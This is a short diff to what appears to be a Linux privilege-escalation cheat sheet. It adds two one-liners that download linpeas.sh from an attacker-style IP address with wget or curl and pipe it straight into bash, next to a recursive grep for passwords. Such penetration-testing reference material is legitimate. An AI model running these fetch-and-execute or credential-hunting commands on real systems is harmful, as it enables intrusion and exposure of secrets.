@@ -299,6 +299,16 @@ Recursively searching for passwords is also a handy technique:
 grep -ri "passw" .
 ```
 
+Wget Pipe a remote URL directory to Bash (linpeas):
+```
+wget -q -O - "http://10.10.10.10/linpeas.sh" | bash
+```
+
+Curl Pipe a remote URL directly to Bash (linpeas):
+```
+curl -sSk "http://10.10.10.10/linpeas.sh" | bash
+```
+
 ## References
 
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/   
